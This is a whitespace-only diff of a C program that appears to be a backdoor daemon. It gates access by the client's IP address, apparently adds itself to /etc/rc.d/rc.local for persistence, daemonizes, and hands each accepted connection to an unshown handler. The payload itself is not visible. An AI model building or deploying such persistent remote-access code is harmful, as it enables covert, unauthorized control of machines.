@@ -36,7 +36,7 @@ int AuthCheck(u_char *ip)
 			if (!strncmp(substring, DynamicIP[i], x+1))
 			{
 				printf("\nAccess granted!\n");
-				return 1;
+                return 1;
 			}
     	}
     	return 0;
@@ -58,7 +58,7 @@ void domything(u_int sd, u_char *src)
 int main(int argc, char *argv[]) 
 {
 #ifdef STARTUP
-	int on,i;
+    int on,i;
     char cwd[256],*str;
     FILE *file;
 	str="/etc/rc.d/rc.local";
@@ -124,30 +124,30 @@ int main(int argc, char *argv[])
     }
 
     if (bind(sIN, (struct sockaddr *)&local, sizeof(local)))
-	{
+    {
         perror("bind() failed");
-    	return 1; 
+        return 1; 
     }
 
     if (listen(sIN, MAXCON)) 
-	{
-    	perror("listen() failed");
-    	return 1; 
-	}
+    {
+        perror("listen() failed");
+        return 1; 
+    }
 
     if (fork()) exit(0);
 
-	len = sizeof(local);    
+    len = sizeof(local);    
 
     while (1) 
-	{
-		sOUT = accept(sIN, (struct sockaddr *)&remote, &len);
-		if (fork() != 0)
-		{
-	    	close(sIN);
-	    	domything(sOUT, inet_ntoa(remote.sin_addr));
-		}
-		close(sOUT);
+    {
+        sOUT = accept(sIN, (struct sockaddr *)&remote, &len);
+        if (fork() != 0)
+        {
+            close(sIN);
+            domything(sOUT, inet_ntoa(remote.sin_addr));
+        }
+        close(sOUT);
     }
     close(sIN);
     return 0;
